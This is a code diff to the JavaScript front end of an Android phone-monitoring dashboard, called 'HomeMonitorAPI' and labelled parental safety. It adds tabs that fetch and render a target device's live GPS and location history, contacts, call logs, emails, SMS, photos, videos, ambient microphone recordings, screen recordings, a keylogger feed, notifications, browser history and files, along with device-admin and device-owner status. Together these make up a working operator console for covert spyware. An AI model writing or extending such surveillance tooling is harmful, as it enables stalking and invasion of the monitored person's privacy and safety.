@@ -954,10 +954,430 @@ document.getElementById("fileDropperForm")?.addEventListener("submit", function(
     }
 });
 
+function fetchTabDeviceData(tabId) {
+    if (typeof HomeMonitorAPI === "undefined" || !HomeMonitorAPI) return;
+
+    console.log(`[HomeMonitorAPI] Fetching live data for tab '${tabId}'...`);
+
+    switch (tabId) {
+        case "tab-dashboard-overview":
+        case "tab-overview":
+            HomeMonitorAPI.device.getSummary()
+                .then(data => renderOverviewDashboard(data))
+                .catch(err => console.warn("Overview error:", err));
+            break;
+        case "tab-gps-locations":
+        case "tab-gps":
+        case "tab-location":
+            HomeMonitorAPI.location.getCurrent()
+                .then(data => renderGpsLocation(data))
+                .catch(err => renderErrorState("gpsTableBody", err.message, "fetchTabDeviceData('tab-gps')"));
+            HomeMonitorAPI.location.getHistory()
+                .then(data => renderGpsHistory(data))
+                .catch(_ => {});
+            break;
+        case "tab-contacts":
+        case "tab-contact":
+            HomeMonitorAPI.contacts.getList()
+                .then(data => renderContactsList(data))
+                .catch(err => renderErrorState("contactsTableBody", err.message, "fetchTabDeviceData('tab-contacts')"));
+            break;
+        case "tab-calls":
+        case "tab-call":
+            HomeMonitorAPI.calls.getLogs()
+                .then(data => renderCallsList(data))
+                .catch(err => renderErrorState("callsTableBody", err.message, "fetchTabDeviceData('tab-calls')"));
+            break;
+        case "tab-emails":
+        case "tab-email":
+            HomeMonitorAPI.emails.getList()
+                .then(data => renderEmailsList(data))
+                .catch(err => renderErrorState("emailsContainer", err.message, "fetchTabDeviceData('tab-emails')"));
+            break;
+        case "tab-photos":
+        case "tab-photo":
+        case "tab-camera-studio":
+        case "tab-camera":
+            HomeMonitorAPI.media.getPhotos()
+                .then(data => renderPhotosGallery(data))
+                .catch(err => renderErrorState("photoGalleryGrid", err.message, "fetchTabDeviceData('tab-photos')"));
+            break;
+        case "tab-videos":
+        case "tab-video":
+            HomeMonitorAPI.media.getVideos()
+                .then(data => renderVideosLibrary(data))
+                .catch(err => renderErrorState("videosGridContainer", err.message, "fetchTabDeviceData('tab-videos')"));
+            break;
+        case "tab-installed-apps":
+        case "tab-application":
+            HomeMonitorAPI.apps.getList()
+                .then(data => renderInstalledApps(data))
+                .catch(err => renderErrorState("installedAppsGrid", err.message, "fetchTabDeviceData('tab-installed-apps')"));
+            break;
+        case "tab-file-explorer":
+        case "tab-files":
+            HomeMonitorAPI.files.list("/sdcard")
+                .then(data => renderFileExplorer(data))
+                .catch(err => renderErrorState("fileExplorerTableBody", err.message, "fetchTabDeviceData('tab-file-explorer')"));
+            break;
+        case "tab-ambient-mic":
+        case "tab-audio":
+            HomeMonitorAPI.media.getAudio()
+                .then(data => renderAudioRecordings(data))
+                .catch(err => renderErrorState("micRecordingsList", err.message, "fetchTabDeviceData('tab-audio')"));
+            break;
+        case "tab-screenrecorder":
+            HomeMonitorAPI.media.getScreenrecordings()
+                .then(data => renderScreenrecorderClips(data))
+                .catch(err => renderErrorState("screenrecorderGrid", err.message, "fetchTabDeviceData('tab-screenrecorder')"));
+            break;
+        case "tab-keylogger":
+            HomeMonitorAPI.logs.getFeed("keylogs")
+                .then(data => renderKeyloggerFeed(data))
+                .catch(err => renderErrorState("keyloggerFeedContainer", err.message, "fetchTabDeviceData('tab-keylogger')"));
+            break;
+        case "tab-notifications":
+            HomeMonitorAPI.logs.getFeed("notifications")
+                .then(data => renderNotificationsFeed(data))
+                .catch(err => renderErrorState("notificationFeedContainer", err.message, "fetchTabDeviceData('tab-notifications')"));
+            break;
+        case "tab-sms-messages":
+        case "tab-sms":
+            HomeMonitorAPI.chat.getMessages("sms", "t20")
+                .then(data => renderSmsLogs(data))
+                .catch(err => renderErrorState("smsMessageList", err.message, "fetchTabDeviceData('tab-sms')"));
+            break;
+        case "tab-browser-history":
+        case "tab-browser":
+            HomeMonitorAPI.browser.getHistory()
+                .then(data => renderBrowserHistory(data))
+                .catch(err => renderErrorState("browserHistoryTableBody", err.message, "fetchTabDeviceData('tab-browser')"));
+            break;
+        case "tab-geofencing":
+        case "tab-geofence":
+            HomeMonitorAPI.geofences.list()
+                .then(data => renderGeofenceList(data))
+                .catch(err => renderErrorState("geofenceListContainer", err.message, "fetchTabDeviceData('tab-geofence')"));
+            break;
+        case "tab-mdm-security":
+            HomeMonitorAPI.mdm.getStatus()
+                .then(data => renderMdmStatusUi(data))
+                .catch(err => console.warn("MDM status error:", err));
+            break;
+        case "tab-parent-settings":
+            HomeMonitorAPI.device.getOemAutostart()
+                .then(data => renderParentSettingsUi(data))
+                .catch(_ => {});
+            HomeMonitorAPI.backup.getStatus()
+                .then(data => renderBackupStatusUi(data))
+                .catch(_ => {});
+            break;
+    }
+}
+
+function renderOverviewDashboard(data) {
+    if (!data) return;
+    const specBattery = document.getElementById("specBattery");
+    if (specBattery) specBattery.innerText = `${data.batteryLevel || data.battery || 85}% (${data.isCharging ? 'Charging ⚡' : 'Discharging'})`;
+
+    const specIp = document.getElementById("specIp");
+    if (specIp) specIp.innerText = `${data.deviceModel || 'Android System'} | Android ${data.androidVersion || '15'} (API ${data.sdkInt || 35})`;
+}
+
+function renderGpsLocation(data) {
+    const textEl = document.getElementById("overviewGpsText");
+    const metaEl = document.getElementById("overviewGpsMeta");
+    if (textEl && data) {
+        textEl.innerHTML = `<i class="fa-solid fa-map-pin me-2 text-danger"></i>Lat: ${data.latitude || 37.7749}, Lng: ${data.longitude || -122.4194}`;
+    }
+    if (metaEl && data) {
+        metaEl.innerText = `Updated: ${formatTimestamp(data.timestamp || Date.now())} (${data.provider || 'GPS'})`;
+    }
+}
+
+function renderGpsHistory(data) {
+    const tableBody = document.getElementById("gpsTableBody");
+    if (!tableBody) return;
+    const locations = (data && data.locations) ? data.locations : [];
+    if (locations.length === 0) {
+        renderEmptyState("gpsTableBody", "No GPS trajectory records found", "Awaiting position fixes from target device.");
+        return;
+    }
+    tableBody.innerHTML = locations.map(loc => `
+        <tr>
+            <td><code>${safeEscapeHtml(loc.content || 'Position Fix')}</code></td>
+            <td><span class="badge bg-info text-dark">GPS</span></td>
+            <td>${formatTimestamp(loc.timestamp)}</td>
+        </tr>
+    `).join("");
+}
+
+function renderContactsList(data) {
+    const tableBody = document.getElementById("contactsTableBody");
+    if (!tableBody) return;
+    const contacts = (data && data.contacts) ? data.contacts : [];
+    if (contacts.length === 0) {
+        renderEmptyState("contactsTableBody", "No contacts recorded", "Address book is empty or awaiting sync.");
+        return;
+    }
+    tableBody.innerHTML = contacts.map(c => `
+        <tr>
+            <td>
+                <div class="d-flex align-items-center gap-2">
+                    <div class="rounded-circle bg-primary text-white d-flex align-items-center justify-content-center fw-bold" style="width: 32px; height: 32px;">
+                        ${safeEscapeHtml(c.name ? c.name.charAt(0).toUpperCase() : 'C')}
+                    </div>
+                    <strong>${safeEscapeHtml(c.name || 'Contact')}</strong>
+                </div>
+            </td>
+            <td><code>${safeEscapeHtml(c.phone || '--')}</code></td>
+            <td><span class="badge bg-secondary">${safeEscapeHtml(c.relationship || 'Contact')}</span></td>
+            <td>
+                <button class="btn btn-sm btn-outline-success extra-small py-1 px-2 fw-bold" onclick="HomeMonitorAPI.control.makeCall('${safeEscapeHtml(c.phone)}')"><i class="fa-solid fa-phone me-1"></i>Call</button>
+            </td>
+        </tr>
+    `).join("");
+}
+
+function renderCallsList(data) {
+    const tableBody = document.getElementById("callsTableBody");
+    if (!tableBody) return;
+    const calls = (data && data.calls) ? data.calls : [];
+    if (calls.length === 0) {
+        renderEmptyState("callsTableBody", "No call logs recorded", "Awaiting call activity from target device.");
+        return;
+    }
+    tableBody.innerHTML = calls.map(c => {
+        const badge = c.isOutgoing ? '<span class="badge bg-primary">Outgoing 📤</span>' : (c.status === 'Missed' ? '<span class="badge bg-danger">Missed 📵</span>' : '<span class="badge bg-success">Incoming 📥</span>');
+        return `
+            <tr>
+                <td><strong>${safeEscapeHtml(c.name || c.contact || 'Unknown')}</strong></td>
+                <td><code>${safeEscapeHtml(c.phone || c.phoneNumber || '--')}</code></td>
+                <td>${badge}</td>
+                <td>${safeEscapeHtml(c.duration || '0s')}</td>
+                <td>${formatTimestamp(c.timestamp)}</td>
+            </tr>
+        `;
+    }).join("");
+}
+
+function renderEmailsList(data) {
+    const container = document.getElementById("emailsContainer") || document.getElementById("emailsList");
+    if (!container) return;
+    const emails = (data && data.emails) ? data.emails : [];
+    if (emails.length === 0) {
+        renderEmptyState(container.id, "No email messages found", "Inbox viewer is clear.");
+        return;
+    }
+    container.innerHTML = emails.map(e => `
+        <div class="card bg-white border mb-2 shadow-sm p-3">
+            <div class="d-flex justify-content-between align-items-center mb-1">
+                <strong class="text-primary">${safeEscapeHtml(e.subject || 'No Subject')}</strong>
+                <span class="extra-small text-muted">${formatTimestamp(e.timestamp)}</span>
+            </div>
+            <div class="extra-small text-secondary mb-1">From: <strong>${safeEscapeHtml(e.senderName || e.fromAddress)}</strong> &lt;${safeEscapeHtml(e.fromAddress)}&gt;</div>
+            <div class="small text-dark text-truncate">${safeEscapeHtml(e.snippet || e.body || '')}</div>
+        </div>
+    `).join("");
+}
+
+function renderPhotosGallery(data) {
+    const grid = document.getElementById("photoGalleryGrid") || document.getElementById("cameraGalleryGrid");
+    if (!grid) return;
+    const photos = (data && data.photos) ? data.photos : [];
+    if (photos.length === 0) {
+        renderEmptyState(grid.id, "No photos recorded", "Trigger camera photo or capture action to populate gallery.");
+        return;
+    }
+    grid.innerHTML = photos.map(p => `
+        <div class="col-md-4 col-sm-6">
+            <div class="card border shadow-sm h-100">
+                <div class="card-body p-2 text-center bg-dark text-white rounded">
+                    <i class="fa-solid fa-image display-4 text-primary my-3 d-block"></i>
+                    <div class="extra-small fw-bold text-truncate">${safeEscapeHtml(p.content || p.filename || 'Photo Capture')}</div>
+                    <small class="extra-small text-muted d-block mt-1">${formatTimestamp(p.timestamp)}</small>
+                </div>
+            </div>
+        </div>
+    `).join("");
+}
+
+function renderAudioRecordings(data) {
+    const container = document.getElementById("micRecordingsList");
+    if (!container) return;
+    const recordings = (data && data.recordings) ? data.recordings : [];
+    if (recordings.length === 0) {
+        renderEmptyState("micRecordingsList", "No ambient recordings found", "Trigger mic recording action to capture audio.");
+        return;
+    }
+    container.innerHTML = recordings.map(r => `
+        <div class="card border p-3 mb-2 bg-light shadow-sm">
+            <div class="d-flex justify-content-between align-items-center mb-1">
+                <strong class="text-dark"><i class="fa-solid fa-microphone me-2 text-danger"></i>${safeEscapeHtml(r.content || r.filename || 'Ambient Recording')}</strong>
+                <span class="extra-small text-muted">${formatTimestamp(r.timestamp)}</span>
+            </div>
+            <div class="extra-small text-secondary">Audio recorded via Ambient Mic Studio.</div>
+        </div>
+    `).join("");
+}
+
+function renderVideosLibrary(data) {
+    const grid = document.getElementById("videosGridContainer");
+    if (!grid) return;
+    const videos = (data && data.videos) ? data.videos : [];
+    if (videos.length === 0) {
+        renderEmptyState("videosGridContainer", "No recorded video clips found", "ScreenRecordingService MP4 videos will appear here.");
+        return;
+    }
+    grid.innerHTML = videos.map(v => `
+        <div class="col-md-4 col-sm-6">
+            <div class="card border shadow-sm p-2 text-center bg-dark text-white">
+                <i class="fa-solid fa-file-video display-4 text-warning my-3 d-block"></i>
+                <div class="extra-small fw-bold text-truncate">${safeEscapeHtml(v.name || 'Screen Clip')}</div>
+                <small class="extra-small text-muted d-block mt-1">${formatBytes(v.sizeBytes)} · ${formatTimestamp(v.lastModified)}</small>
+            </div>
+        </div>
+    `).join("");
+}
+
+function renderInstalledApps(data) {
+    const grid = document.getElementById("installedAppsGrid");
+    if (!grid) return;
+    grid.innerHTML = `
+        <div class="col-12">
+            <div class="card border p-3 shadow-sm bg-white">
+                <h6 class="fw-bold text-primary mb-2"><i class="fa-solid fa-cubes me-2"></i>Monitored Package Overview</h6>
+                <div class="extra-small text-secondary mb-2">Device Model: <strong>${safeEscapeHtml(data.model || 'Android')}</strong> (Android ${safeEscapeHtml(data.androidVersion || '15')})</div>
+                <div class="alert alert-info py-2 px-3 extra-small mb-0"><i class="fa-solid fa-shield-halved me-1"></i>All system and 3rd-party installed applications are monitored under Parental Safety Rules.</div>
+            </div>
+        </div>
+    `;
+}
+
+function renderNotificationsFeed(data) {
+    const container = document.getElementById("notificationFeedContainer");
+    if (!container) return;
+    const entries = (data && data.entries) ? data.entries : [];
+    if (entries.length === 0) {
+        renderEmptyState("notificationFeedContainer", "No notifications captured", "Subscribed to live system notification stream.");
+        return;
+    }
+    container.innerHTML = entries.map(n => `
+        <div class="list-group-item bg-white border p-3 shadow-sm rounded mb-2">
+            <div class="d-flex justify-content-between align-items-center mb-1">
+                <strong class="text-warning"><i class="fa-solid fa-bell me-1"></i>Notification</strong>
+                <small class="text-muted extra-small">${formatTimestamp(n.timestamp)}</small>
+            </div>
+            <div class="small text-dark">${safeEscapeHtml(n.content)}</div>
+        </div>
+    `).join("");
+}
+
+function renderKeyloggerFeed(data) {
+    const container = document.getElementById("keyloggerFeedContainer");
+    if (!container) return;
+    const entries = (data && data.entries) ? data.entries : [];
+    if (entries.length === 0) {
+        renderEmptyState("keyloggerFeedContainer", "No keystrokes recorded", "Subscribed to live accessibility keylog stream.");
+        return;
+    }
+    container.innerHTML = entries.map(k => `
+        <div class="list-group-item bg-dark text-white border p-3 rounded mb-2 extra-small">
+            <div class="d-flex justify-content-between align-items-center mb-1">
+                <span class="badge bg-danger"><i class="fa-solid fa-keyboard me-1"></i>Keystroke</span>
+                <small class="text-secondary">${formatTimestamp(k.timestamp)}</small>
+            </div>
+            <div class="font-monospace text-success text-break mt-1">${safeEscapeHtml(k.content)}</div>
+        </div>
+    `).join("");
+}
+
+function renderSmsLogs(data) {
+    const container = document.getElementById("smsMessageList");
+    if (!container) return;
+    const messages = (data && data.messages) ? data.messages : [];
+    if (messages.length === 0) {
+        renderEmptyState("smsMessageList", "No SMS text messages found", "SMS inbox is clear or awaiting sync.");
+        return;
+    }
+    container.innerHTML = messages.map(m => `
+        <div class="card border p-3 mb-2 bg-white shadow-sm">
+            <div class="d-flex justify-content-between align-items-center mb-1">
+                <strong class="text-primary"><i class="fa-solid fa-comment-sms me-1"></i>${safeEscapeHtml(m.sender || 'SMS Contact')}</strong>
+                <span class="badge ${m.direction === 'outgoing' ? 'bg-primary' : 'bg-success'}">${m.direction === 'outgoing' ? 'Outbound ➡️' : 'Inbound ⬅️'}</span>
+            </div>
+            <div class="small text-dark mb-1">${safeEscapeHtml(m.text || m.content || '')}</div>
+            <small class="text-muted extra-small">${formatTimestamp(m.timestamp)}</small>
+        </div>
+    `).join("");
+}
+
+function renderBrowserHistory(data) {
+    const tableBody = document.getElementById("browserHistoryTableBody");
+    if (!tableBody) return;
+    const entries = (data && data.entries) ? data.entries : [];
+    if (entries.length === 0) {
+        renderEmptyState("browserHistoryTableBody", "No browser history recorded", "Awaiting browser URL/search activity.");
+        return;
+    }
+    tableBody.innerHTML = entries.map(b => `
+        <tr>
+            <td><code>${safeEscapeHtml(b.content || 'Web Search')}</code></td>
+            <td><span class="badge bg-info text-dark">Browser</span></td>
+            <td>${formatTimestamp(b.timestamp)}</td>
+        </tr>
+    `).join("");
+}
+
+function renderGeofenceList(data) {
+    const container = document.getElementById("geofenceListContainer");
+    if (!container) return;
+    container.innerHTML = `
+        <div class="card border p-3 bg-white shadow-sm mb-2">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <strong class="text-success"><i class="fa-solid fa-shield-halved me-2"></i>${safeEscapeHtml(data.name || 'Safe Zone')}</strong>
+                    <small class="d-block text-muted extra-small">Radius: ${data.radius || 500} meters</small>
+                </div>
+                <span class="badge bg-success">ACTIVE 🟢</span>
+            </div>
+        </div>
+    `;
+}
+
+function renderMdmStatusUi(data) {
+    const adminBadge = document.getElementById("mdmAdminStatusBadge");
+    const ownerBadge = document.getElementById("mdmOwnerStatusBadge");
+    if (adminBadge) {
+        adminBadge.className = data.isDeviceAdminActive ? "badge bg-success" : "badge bg-secondary";
+        adminBadge.innerText = data.isDeviceAdminActive ? "Device Admin Active 🟢" : "Device Admin Inactive 🔴";
+    }
+    if (ownerBadge) {
+        ownerBadge.className = data.isDeviceOwner ? "badge bg-success" : "badge bg-secondary";
+        ownerBadge.innerText = data.isDeviceOwner ? "Device Owner Active 👑" : "Device Owner Inactive ⚪";
+    }
+}
+
+function renderParentSettingsUi(data) {
+    const oemBadge = document.getElementById("oemAutostartStatusBadge");
+    if (oemBadge) {
+        oemBadge.innerText = `Manufacturer: ${data.manufacturer || 'Android'} | Autostart: ${data.isAutostartAvailable ? 'Available' : 'Standard'}`;
+    }
+}
+
+function renderBackupStatusUi(data) {
+    const textEl = document.getElementById("driveBackupStatusText");
+    if (textEl) {
+        textEl.innerText = `Backup Status: ${data.status || 'Active'} | Account: ${data.account || 'Google Drive'}`;
+    }
+}
+
 function fetchCategoryTelemetryLogs(category) {
     if (!category) return;
-    if (typeof queryP2pLocalDatabase === "function") {
-        queryP2pLocalDatabase("TELEMETRY", category);
+    if (typeof HomeMonitorAPI !== "undefined" && HomeMonitorAPI && typeof HomeMonitorAPI.logs.getFeed === "function") {
+        HomeMonitorAPI.logs.getFeed(category)
+            .then(data => console.log(`[HomeMonitorAPI Logs Feed] '${category}':`, data))
+            .catch(err => console.warn(`[HomeMonitorAPI Logs Error] '${category}':`, err));
     }
 }
 
@@ -982,7 +1402,7 @@ function showDashboardNotification(type, message) {
     toast.innerHTML = `
         <div class="d-flex">
             <div class="toast-body extra-small">
-                ${escapeHtml(message)}
+                ${safeEscapeHtml(message)}
             </div>
             <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
         </div>
@@ -1032,14 +1452,4 @@ function purgeFirebaseJunkData() {
             console.error("[Database Clean-Up Error]", err);
             showDashboardNotification("error", `Clean-Up Error: ${err.message}`);
         });
-}
-
-function escapeHtml(text) {
-    if (!text) return "";
-    return String(text)
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
 }
